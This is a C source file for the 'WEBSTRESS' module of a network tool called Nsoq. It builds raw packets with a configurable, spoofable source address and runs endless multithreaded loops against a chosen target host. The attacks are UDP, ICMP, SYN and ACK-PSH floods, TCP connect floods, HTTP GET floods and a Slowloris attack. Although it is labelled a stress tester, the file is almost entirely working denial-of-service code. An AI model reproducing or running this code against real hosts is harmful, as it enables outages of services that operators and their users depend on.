/*......,,,,,,,.............................................................
*
* @@NAME:     Module WEBSTRESS
* @@VERSION:  1.0.4
* @@DESC:     WEBSTRESS source file (this file is part of Nsoq tool).
* @@AUTHOR:   Felipe Ecker (Khun) <khun@hexcodes.org>
* @@DATE:     18/10/2012 16:30:00
* @@MANIFEST:
*      Copyright (C) Felipe Ecker 2003-2014.
*      You should have received a copy of the GNU General Public License 
*      inside this program. Licensed under GPL 3
*      If not, write to me an e-mail please. Thank you.
*
*...........................................................................
*/

#include "../include/core.h"

static struct __data _data;      /* Sender bulk */

inline static void __packing( const uint32 __type,
                              uchar *buffer,
                              const uint32 size,
                              struct sockaddr_in *source,
                              struct sockaddr_in *target ) {

   struct tcphdr *__tcp   = (struct tcphdr *) (buffer + SIZE_IP);
   struct udphdr *__udp   = (struct udphdr *) (buffer + SIZE_IP);

   struct __auxhdr {
      uint32 saddr;
      uint32 daddr;
      uint8 useless;
      uint8 proto;
      uint16 tcpsiz;
      struct tcphdr tcp;
/* llvm doesnt support variable size in structure */
#ifdef __llvm__
      uchar data[52 - (SIZE_IP + SIZE_TCP)];
#else
      uchar data[size - (SIZE_IP + SIZE_TCP)];
#endif
   } __packed__ tcpaux;   

   struct __auxhdr2 {
      uint32 saddr;
      uint32 daddr;
      uint8 useless;
      uint8 proto;
      uint16 udpsiz;
      struct udphdr udp;
/* llvm doesnt support variable size in structure */
#ifdef __llvm__
      uchar data[40 - (SIZE_IP + SIZE_UDP)];
#else
      uchar data[size - (SIZE_IP + SIZE_UDP)];
#endif
   } __packed__ udpaux;

#if !defined(__BSD_SYSTEM__)
   struct iphdr *__ip      = (struct iphdr *) buffer;
   struct icmphdr *__icmp  = (struct icmphdr *) (buffer + SIZE_IP);

   __ip->saddr    = source->sin_addr.s_addr;
   __ip->daddr    = target->sin_addr.s_addr;
   __ip->version  = 0x04;
   __ip->ihl      = 0x05;
   __ip->ttl      = pkt->ttl;
   __ip->id       = htons(rand() % 0xFFFF);
   __ip->tot_len  = htons(size);
   __ip->check    = __checksum((uint16 *) __ip, SIZE_IP);

   switch(__type) {
      case WEB_UDP:
         __ip->protocol           = IPPROTO_UDP;

         __udp->source            = source->sin_port;
         __udp->dest              = target->sin_port;
         __udp->len               = htons(size - SIZE_IP);
         __udp->check             = 0x00;

         memset(&udpaux, 0, sizeof(struct __auxhdr2));
         udpaux.saddr             = __ip->saddr;
         udpaux.daddr             = __ip->daddr;
         udpaux.useless           = 0x0;
         udpaux.proto             = IPPROTO_UDP;
         udpaux.udpsiz            = htons(size - SIZE_IP);

         memcpy(&udpaux.udp, __udp, SIZE_UDP);
         __udp->check   = __checksum( (uint16 *) &udpaux, (size - SIZE_IP));
         break;

      case WEB_ICMP:
         __ip->protocol           = IPPROTO_ICMP;

         __icmp->type             = 0x08;
         __icmp->code             = 0x00;
         __icmp->un.echo.id       = htons(rand() % 0xFFFF);
         __icmp->un.echo.sequence = htons(rand() % 0xFFFF);
         __icmp->checksum         = __checksum( (uint16 *) __icmp, SIZE_ICMP);
         break;

      case WEB_TCP:
         __ip->protocol = IPPROTO_TCP;

         __tcp->source  = source->sin_port;
         __tcp->dest    = target->sin_port;
         __tcp->seq     = htonl(rand() % 0xFFFFFFFF);
         __tcp->ack_seq = (pkt->tcpType & TCP_ACK) ? htonl(rand() % 0xFFFFFFFF) : 0x00000000;
         __tcp->res1    = 0x0;
         __tcp->doff    = 0x5;
         __tcp->res2    = 0x0;
         __tcp->fin     = 0x0;
         __tcp->syn     = (pkt->tcpType & TCP_SYN) ? 0x01 : 0x00;
         __tcp->rst     = 0x00;
         __tcp->psh     = (pkt->tcpType & TCP_PSH) ? 0x01 : 0x00;
         __tcp->ack     = (pkt->tcpType & TCP_ACK) ? 0x01 : 0x00;
         __tcp->urg     = 0x00;
         __tcp->window  = htons(1024); 
         /* I'll set size window to 1024. Don't care about is. */
         __tcp->urg_ptr = 0x00;
         __tcp->check   = 0x00;

         memset(&tcpaux, 0, sizeof(struct __auxhdr));
         tcpaux.saddr   = __ip->saddr;
         tcpaux.daddr   = __ip->daddr;
         tcpaux.useless = 0x0;
         tcpaux.proto   = IPPROTO_TCP;
         tcpaux.tcpsiz  = htons(size - SIZE_IP);

         memcpy(&tcpaux.tcp, __tcp, SIZE_TCP);
         __tcp->check   = __checksum( (uint16 *) &tcpaux, (size - SIZE_IP));
         break;

      default: pass;
   }

#else
   struct ip *__ip      = (struct ip *) buffer;
   struct icmp *__icmp  = (struct icmp *) (buffer + SIZE_IP);

   __ip->ip_src   = source->sin_addr;
   __ip->ip_dst   = target->sin_addr;
   __ip->ip_v     = 0x04;
   __ip->ip_off   = 0x00;
   __ip->ip_hl    = 0x05;
   __ip->ip_ttl   = pkt->ttl;
   __ip->ip_id    = htons(rand() % 0xFFFF);
   __ip->ip_len   = size;
   __ip->ip_sum   = __checksum((uint16 *) __ip, SIZE_IP);

   switch(__type) {
      case WEB_UDP:
         __ip->ip_p        = IPPROTO_UDP;

         __udp->uh_sport   = source->sin_port;
         __udp->uh_dport   = target->sin_port;
         __udp->uh_ulen    = htons(size - SIZE_IP);
         __udp->uh_sum     = 0x00;

         memset(&udpaux, 0, sizeof(struct __auxhdr2));
         udpaux.saddr      = __ip->ip_src.s_addr;
         udpaux.daddr      = __ip->ip_dst.s_addr;
         udpaux.useless    = 0x0;
         udpaux.proto      = IPPROTO_UDP;
         udpaux.udpsiz     = htons(size - SIZE_IP);

         memcpy(&udpaux.udp, __udp, SIZE_UDP);
         __udp->uh_sum     = __checksum( (uint16 *) &udpaux, (size - SIZE_IP));
         break;

      case WEB_ICMP:
         __ip->ip_p        = IPPROTO_ICMP;

         __icmp->icmp_type = 0x08;
         __icmp->icmp_code = 0x00;
         __icmp->icmp_id   = htons(rand() % 0xFFFF);
         __icmp->icmp_seq  = htons(rand() % 0xFFFF);
         __icmp->icmp_cksum= __checksum( (uint16 *) __icmp, SIZE_ICMP);
         break;

      case WEB_TCP:
         __ip->ip_p        = IPPROTO_TCP;

         __tcp->th_sport   = source->sin_port;
         __tcp->th_dport   = target->sin_port;
         __tcp->th_seq     = htonl(rand() % 0xFFFFFFFF);
         __tcp->th_ack     = (pkt->tcpType & TCP_ACK) ? htonl(rand() % 0xFFFFFFFF) : 0x00000000;
         __tcp->th_x2      = 0x0;
         __tcp->th_off     = 0x5;
         __tcp->th_flags  |= (pkt->tcpType & TCP_SYN) ? TCP_SYN : 0x00;
         __tcp->th_flags  |= (pkt->tcpType & TCP_ACK) ? TCP_ACK : 0x00;
         __tcp->th_flags  |= (pkt->tcpType & TCP_PSH) ? TCP_PSH : 0x00;
         __tcp->th_win     = htons(1024); 
         /* I'll set size window to 1024. Don't care about is. */
         __tcp->th_urp     = 0x00;
         __tcp->th_sum     = 0x00;

         memset(&tcpaux, 0, sizeof(struct __auxhdr));
         tcpaux.saddr      = __ip->ip_src.s_addr;
         tcpaux.daddr      = __ip->ip_dst.s_addr;
         tcpaux.useless    = 0x0;
         tcpaux.proto      = IPPROTO_TCP;
         tcpaux.tcpsiz     = htons(size - SIZE_TCP);

         memcpy(&(tcpaux.tcp), __tcp, SIZE_TCP);
         __tcp->th_sum   = __checksum( (uint16 *) &tcpaux, (size - SIZE_IP));
         break;

      default: pass;
   }
#endif
}


#if !defined(WEAK_GCC) 
__call__ inline static void __udp_stress() {
#else
inline static void __udp_stress() {
#endif

   register uint32 sock;

   pthread_mutex_lock(&__mutex);
   /* RAW socket*/
   if ( !( sock = __socketPool(true, 0, false)) ) {
      pthread_mutex_unlock(&__mutex);
      pthread_exit(NULL);
   }
   pthread_mutex_unlock(&__mutex);

   __set_hdrincl(sock);

   uchar cbuffer[pkt->buffsize + 40];
   memset(cbuffer, 0, sizeof(cbuffer));

   __packing(WEB_UDP, cbuffer, (uint32) sizeof(cbuffer), _data.source, _data.target);

   show("[WEB STRESS] Sending UDP packets to host [%s] on port %d...\n", 
   pkt->dst, pkt->port);

   register uint8 tsize = sizeof(struct sockaddr_in);
   register uint8 size = sizeof(cbuffer);
   register uchar *buffer = cbuffer;
   register struct sockaddr_in *targ = _data.target;

   __SEND:
      sendto(sock, buffer, size, 0, (struct sockaddr *) targ, tsize);
      __packing(WEB_UDP, cbuffer, (uint32) sizeof(cbuffer), _data.source, _data.target);
   goto __SEND;

   pthread_exit(NULL);
}


#if !defined(WEAK_GCC) 
__call__ inline static void __tcp_stress() {
#else
inline static void __tcp_stress() {
#endif

   register uint32 sock;

   pthread_mutex_lock(&__mutex);
   /* RAW socket*/
   if ( !( sock = __socketPool(false, __TCP_MODE__, true)) ) {
      pthread_mutex_unlock(&__mutex);
      pthread_exit(NULL);
   }
   pthread_mutex_unlock(&__mutex);

   __set_nonblock(sock);

   register uint8 tsize = sizeof(struct sockaddr);
   register struct sockaddr_in *targ = _data.target;

   show("Connecting to host on port %d...\n", pkt->port);
   connect(sock, (struct sockaddr *) targ, tsize);

   struct timeval _times;
   fd_set beep, wr;
   _times.tv_sec = 5;
   _times.tv_usec = 0;
   FD_ZERO(&beep);
   FD_ZERO(&wr);
   FD_SET(sock, &beep);
   FD_SET(sock, &wr);

   if ( select(sock+1, &beep, &wr, NULL, &_times) != 1) {
      log("Unable to connect on host. Closed port ??\n");
      kill(getpid(), SIGALRM);
      pthread_exit(NULL);
   }

   close(sock);
   uchar cbuffer[pkt->buffsize + 40];
   memset(cbuffer, 0x58, sizeof(cbuffer));
   signal(SIGPIPE, SIG_IGN);

   register uchar *data = cbuffer;
   register uint32 size = sizeof(cbuffer);

   show("[Connected]\n");
   show("[WEB STRESS] Making TCP connections to the host [%s] on port %d..\n",
   pkt->dst, pkt->port);

   __CONNECT:
      sock = socket(AF_INET, SOCK_STREAM, 0);
      __set_nodelay(sock);
      connect(sock, (struct sockaddr *) targ, tsize);
      send(sock, data, size, MSG_OOB);
      close(sock);
   goto __CONNECT;

   pthread_exit(NULL);
}


#if !defined(WEAK_GCC) 
__call__ inline static void __http_stress() {
#else
inline static void __http_stress() {
#endif

   register uint32 sock;

   pthread_mutex_lock(&__mutex);
   /* RAW socket*/
   if ( !( sock = __socketPool(false, __TCP_MODE__, true)) ) {
      pthread_mutex_unlock(&__mutex);
      pthread_exit(NULL);
   }
   pthread_mutex_unlock(&__mutex);

   __set_nonblock(sock);
   __set_keepalive(sock);

   register uint8 tsize = sizeof(struct sockaddr);
   register struct sockaddr_in *targ = _data.target;

   char __http[1024];
   memset(__http, 0, sizeof(__http));
   snprintf(__http, sizeof(__http) - 1, 
      "GET / HTTP/1.1\r\n"
      "Host: %s\r\n"
      "User-Agent: Nsoq Signature\r\n"
      "Keep-Alive: 10000\r\n\r\n", pkt->dst);

   show("Connecting to host on port %d...\n", pkt->port);
   connect(sock, (struct sockaddr *) targ, tsize);

   struct timeval _times;
   fd_set beep, wr;
   _times.tv_sec = 5;
   _times.tv_usec = 0;
   FD_ZERO(&beep);
   FD_ZERO(&wr);
   FD_SET(sock, &beep);
   FD_SET(sock, &wr);

   if ( select(sock+1, &beep, &wr, NULL, &_times) != 1) {
      log("Unable to connect on host. Closed port ??\n");
      log("[Timeout]\n");
      kill(getpid(), SIGALRM);
      pthread_exit(NULL);
   } 

   close(sock);
   signal(SIGPIPE, SIG_IGN);
   register char *data = __http;
   register uint16 size = strlen(__http);

   show("[Connected]\n");
   show("[WEB STRESS] Making HTTP Requests to host [%s] on port %d...\n", 
   pkt->dst, pkt->port);

   __WEB:
      sock = socket(AF_INET, SOCK_STREAM, 0);
      __set_nodelay(sock);
      connect(sock, (struct sockaddr *) targ, tsize);
      send(sock, data, size, 0);
      usleep(40000);
      close(sock);
   goto __WEB;

   pthread_exit(NULL);
}


#if !defined(WEAK_GCC) 
__call__ inline static void __icmp_stress() {
#else
inline static void __icmp_stress() {
#endif

   register signed int sock;

   pthread_mutex_lock(&__mutex);
   /* ICMP RAW socket*/
   if ( !( sock = __socketPool(false, __ICMP_MODE__, false)) ) {
      pthread_mutex_unlock(&__mutex);
      pthread_exit(NULL);
   }
   pthread_mutex_unlock(&__mutex);

   __set_broadcast(sock);
   __set_hdrincl(sock);

   uchar cbuffer[pkt->buffsize + 40];
   memset(cbuffer, 0, sizeof(cbuffer));
   __packing(WEB_ICMP, cbuffer, (uint16) sizeof(cbuffer), _data.source, _data.target);

   show("[WEB STRESS] Sending ICMP packets to host [%s]...\n", pkt->dst);

   register uint8 tsize = sizeof(struct sockaddr_in);
   register uint32 size = sizeof(cbuffer);
   register uchar *buffer = cbuffer;
   register struct sockaddr_in *targ = _data.target;

   __SENDING:
      sendto(sock, buffer, size, 0, (struct sockaddr *) targ, tsize);
   goto __SENDING;

   pthread_exit(NULL);
}


#if !defined(WEAK_GCC) 
__call__ inline static void __syn_stress() {
#else
inline static void __syn_stress() {
#endif

   register uint32 sock;

   pthread_mutex_lock(&__mutex);
   /* RAW socket*/
   if ( !( sock = __socketPool(true, 0, false)) ) {
      pthread_mutex_unlock(&__mutex);
      pthread_exit(NULL);
   }
   pthread_mutex_unlock(&__mutex);

   __set_hdrincl(sock);

   uchar cbuffer[pkt->buffsize + 52];
   memset(cbuffer, 0, sizeof(cbuffer));

   __packing(WEB_TCP, cbuffer, (uint16) sizeof(cbuffer), _data.source, _data.target);

   show("[WEB STRESS] Sending TCP SYN packets to host [%s] on port %d...\n", 
   pkt->dst, pkt->port);

   register uint8 tsize = sizeof(struct sockaddr_in);
   register uint32 size = sizeof(cbuffer);
   register uchar *buffer = cbuffer;
   register struct sockaddr_in *targ = _data.target;

   __LOAD:
      sendto(sock, buffer, size, 0, (struct sockaddr *) targ, tsize);
      __packing(WEB_TCP, cbuffer, (uint16) sizeof(cbuffer), _data.source, _data.target);
   goto __LOAD;

   pthread_exit(NULL);
}


#if !defined(WEAK_GCC) 
__call__ inline static void __ack_stress() {
#else
inline static void __ack_stress() {
#endif

   register uint32 sock;

   pthread_mutex_lock(&__mutex);
   /* RAW socket*/
   if ( !( sock = __socketPool(true, 0, false)) ) {
      pthread_mutex_unlock(&__mutex);
      pthread_exit(NULL);
   }
   pthread_mutex_unlock(&__mutex);

   __set_hdrincl(sock);

   uchar cbuffer[pkt->buffsize + 52];
   memset(cbuffer, 0, sizeof(cbuffer));

   __packing(WEB_TCP, cbuffer, (uint16) sizeof(cbuffer), _data.source, _data.target);

   show("[WEB STRESS] Sending TCP ACK-PSH packets to host [%s] on port %d..\n",
   pkt->dst, pkt->port);

   register uint8 tsize = sizeof(struct sockaddr_in);
   register uint32 size = sizeof(cbuffer);
   register uchar *buffer = cbuffer;
   register struct sockaddr_in *targ = _data.target;

   __LOADING:
      sendto(sock, buffer, size, 0, (struct sockaddr *) targ, tsize);
      __packing(WEB_TCP, cbuffer, (uint16) sizeof(cbuffer), _data.source, _data.target);
   goto __LOADING;

   pthread_exit(NULL);
}


#if !defined(WEAK_GCC) 
__call__ inline static void __slow_stress() {
#else
inline static void __slow_stress() {
#endif

   register uint32 sock;

   pthread_mutex_lock(&__mutex);
   /* RAW socket*/
   if ( !( sock = __socketPool(false, __TCP_MODE__, true)) ) {
      pthread_mutex_unlock(&__mutex);
      pthread_exit(NULL);
   }
   pthread_mutex_unlock(&__mutex);

   __set_nonblock(sock);
   __set_keepalive(sock);

   register uint8 tsize = sizeof(struct sockaddr);
   register struct sockaddr_in *targ = _data.target;

   char __http[1024];
   memset(__http, 0, sizeof(__http));
   snprintf(__http, sizeof(__http) - 1,
      "GET / HTTP/1.1\r\n"
      "Host: %s\r\n"
      "User-Agent: Nsoq Signature\r\n"
      "Keep-Alive: 900\r\n", pkt->dst);

   show("Connecting to host on port %d...\n", pkt->port);
   connect(sock, (struct sockaddr *) targ, tsize);

   struct timeval _times;
   fd_set beep, wr;
   _times.tv_sec = 5;
   _times.tv_usec = 0;
   FD_ZERO(&beep);
   FD_ZERO(&wr);
   FD_SET(sock, &beep);
   FD_SET(sock, &wr);

   if ( select(sock+1, &beep, &wr, NULL, &_times) != 1) {
      log("Unable to connect on host. Closed port ??\n");
      log("[Timeout]\n");
      kill(getpid(), SIGALRM);
      pthread_exit(NULL);
   }

   close(sock);
   signal(SIGPIPE, SIG_IGN);

   register char *data = __http;
   register uint16 size = strlen(__http);

   show("[Connected]\n");
   show("[WEB STRESS] Making SlowLoris HTTP Requests to host [%s] on port %d...\n",
   pkt->dst, pkt->port);

   __WEB:
      sock = socket(AF_INET, SOCK_STREAM, 0);
      __set_keepalive(sock);
      connect(sock, (struct sockaddr *) targ, tsize);
      send(sock, data, size, 0);
      usleep(100000);
   goto __WEB;

   pthread_exit(NULL);
}


bool web( const char **pull __unused__ ) {

   signal(SIGINT, __sigcatch);
   signal(SIGALRM, __sigcatch);

   _data.source = (struct sockaddr_in *) addressbuff;
   _data.target = (struct sockaddr_in *) addressbuff + sizeof(struct sockaddr_in);

   if (!__lookup(_data.source, pkt->src, pkt->srcport, true)) return false;
   if (!__lookup(_data.target, pkt->dst, pkt->port, false)) return false;

   const void *func;
   if (pkt->webType & WEB_UDP) func = &__udp_stress;
   else if (pkt->webType & WEB_TCP) func = &__tcp_stress;
   else if (pkt->webType & WEB_HTTP) func = &__http_stress;
   else if (pkt->webType & WEB_ICMP) func = &__icmp_stress;
   else if (pkt->webType & WEB_SYN) func = &__syn_stress;
   else if (pkt->webType & WEB_ACK) func = &__ack_stress;
   else if (pkt->webType & WEB_SLOW) func = &__slow_stress;
   else func = NULL;

   if ( !__threadPool(pkt->numThreads, func, NULL) ) return false;

   return true;
}

